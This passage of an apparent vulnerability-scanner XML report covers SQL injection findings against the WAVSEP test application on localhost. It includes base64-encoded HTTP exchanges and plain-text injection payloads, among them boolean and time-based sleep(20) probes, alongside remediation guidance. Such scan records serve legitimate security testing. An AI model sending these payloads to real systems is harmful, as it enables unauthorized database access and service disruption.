      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NzozNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAxLTAxJiMzOTsmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjM3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1OTQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxMjUyMjk3MTYlMjBvciUyMDE5NDklM2QwMTk0OQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDc5Nw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0ODo1NyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICYjMzk7MjAxMC0wMS0wMTI1MjI5NzE2IG9yIDE5NDk9MDE5NDkmIzM5OzwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjU3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1944942863632037888</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>77057410 or 9266=09266</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0ODoxMCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAxLTAxJiMzOTsmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcG